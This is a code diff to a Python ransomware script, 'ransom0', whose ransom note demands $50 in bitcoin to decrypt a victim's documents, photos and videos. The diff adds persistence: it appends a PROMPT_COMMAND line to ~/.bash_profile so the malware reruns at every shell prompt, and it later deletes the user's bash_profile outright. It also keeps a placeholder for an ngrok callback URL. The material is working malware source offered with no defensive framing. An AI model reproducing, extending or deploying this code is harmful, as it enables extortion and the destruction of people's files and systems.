@@ -1,3 +1,4 @@
+#!/usr/local/bin/python3
 import os
 import shutil
 import http.client
@@ -5,7 +6,7 @@ import subprocess
 import base64
 
 from datetime import datetime
-from os import name, path
+from os import name, path, remove
 from random import randint
 
 
@@ -40,7 +41,7 @@ digits = randint(1111, 9999)
 crypto = Crypto(Crypto.generate_key(32))
 key = crypto.key
 
-url = 'kali'  # PUT THE URL YOU GOT FROM NGROK HERE
+url = 'm1'  # PUT THE URL YOU GOT FROM NGROK HERE
 
 
 class ransom0:
@@ -157,17 +158,13 @@ def StartRansom():
         StartRansom()
 
 
-StartRansom()
-
 PATH = os.getcwd()
-
-
 
 
 def DECRYPT_FILE():
     print('YOUR FILES HAVE BEEN ENCRYPTED')
     print('YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.')
-    print('to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGIT to mail@mail.com')
+    print('to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of transfer and your DIGIT to mail@mail.com')
     print('YOUR DIGIT IS {}'.format(digits))
     pretty_key = input("Your decryption key: ")
 
@@ -196,12 +193,37 @@ def DECRYPT_FILE():
 
 
 if __name__ == '__main__':
+    bashrc_path = path.expanduser('~/.bash_profile')
+    decrypted_path = path.expanduser('~/.decrypted')
+    prompt_cmd = "export PROMPT_COMMAND=~/ransom0.py"
+
+    if path.exists(decrypted_path):
+        exit(0)
+
+    if path.exists(bashrc_path):
+        with open(bashrc_path) as f:
+            bashrc_content = f.read()
+
+        if bashrc_content.strip().endswith(prompt_cmd):
+            pass
+        else:
+            f = open(bashrc_path, 'a')
+            f.write("\n{}\n".format(prompt_cmd))
+            f.close()
+    else:
+        f = open(bashrc_path, 'w')
+        f.write("{}\n".format(prompt_cmd))
+        f.close()
+
     # Generate digits ID or read generated value from digits.txt
     if path.exists("logs") is True:
         f = open("logs/digits.txt", "r")
         digits = f.read()
         f.close()
         DECRYPT_FILE()
+        f = open(decrypted_path, 'w')
+        f.close()
+        remove(bashrc_path)
     else:
         os.mkdir("logs")
         f = open("logs/digits.txt", "w")
